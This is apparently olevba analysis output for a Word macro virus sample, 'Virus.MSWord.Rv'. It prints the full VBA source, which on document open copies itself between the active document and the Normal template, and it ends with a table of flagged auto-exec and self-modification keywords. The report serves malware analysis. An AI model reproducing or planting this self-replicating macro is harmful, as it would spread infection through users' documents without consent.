olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Rv
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Rv - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' --Replication Virus--
Private Sub document_open()
Set norm = NormalTemplate.VBProject.vbcomponents.Item(1).codemodule
Set actve = ActiveDocument.VBProject.vbcomponents.Item(1).codemodule
If norm.lines(1, 1) <> "' --Replication Virus--" Then
  Set Destination = NormalTemplate.VBProject.vbcomponents.Item(1).codemodule
  Dim count As Integer
  Destination.deletelines 1, Destination.countoflines
  Set Source = ActiveDocument.VBProject.vbcomponents.Item(1).codemodule
  count = Source.countoflines
  Destination.insertlines 1, Source.lines(1, count)
    ElseIf norm.lines(1, 1) = "' --Replication Virus--" Then
      If actve.lines(1, 1) = "' --Replication Virus--" Then
      End
      End If
    Set Source = NormalTemplate.VBProject.vbcomponents.Item(1).codemodule
    Set Destination = ActiveDocument.VBProject.vbcomponents.Item(1).codemodule
    Destination.deletelines 1, Destination.countoflines
    Dim counta As Integer
    counta = Source.countoflines
    Destination.insertlines 1, Source.lines(1, counta)
    End If
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |document_open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|vbcomponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

